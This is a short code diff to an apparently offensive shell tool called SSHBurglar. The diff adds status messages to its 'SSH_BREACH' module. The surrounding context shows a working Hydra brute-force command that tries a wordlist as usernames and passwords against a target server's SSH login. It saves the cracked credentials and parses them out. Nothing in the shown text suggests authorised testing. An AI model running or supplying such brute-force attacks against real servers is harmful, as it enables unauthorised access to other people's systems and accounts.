@@ -93,6 +93,9 @@ function SSHBREACH()
 	echo "[*] EXECUTION OF SSH_BREACH MODULE:"
 	echo " "
 	WordList=~/SSHBurglar/wordlist.txt
+	echo " "
+	echo "[*] Executing Hydra SSH Brute-Force Attack......(This may take a long time)"
+	echo " "
 	sudo hydra -f -L $WordList -P $WordList $vpsip ssh -t 4 -vV > crackedusers.txt
 	crackstatus=$(cat crackedusers.txt | grep host: | awk '{print $2}')
 	
